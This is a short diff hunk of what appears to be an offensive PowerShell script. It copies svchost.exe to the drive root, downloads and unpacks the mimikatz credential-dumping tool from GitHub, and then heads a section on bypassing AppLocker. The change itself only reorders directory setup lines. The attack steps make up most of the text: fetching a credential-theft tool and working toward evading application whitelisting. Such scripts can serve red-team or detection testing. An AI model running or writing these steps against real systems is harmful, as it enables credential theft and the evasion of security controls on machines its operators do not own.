@@ -6,11 +6,11 @@ Copy-Item -Path C:\Windows\System32\svchost.exe C:\
 C:\svchost.exe
 
 # Download and expand mimikatz
-https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
+mkdir c:\install
+cd c:\install
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip","c:\install\mimikatz_trunk.zip")
-cd c:\install
 Expand-Archive -LiteralPath 'c:\install\mimikatz_trunk.zip'
 
 # Attempt to bypass App Locker
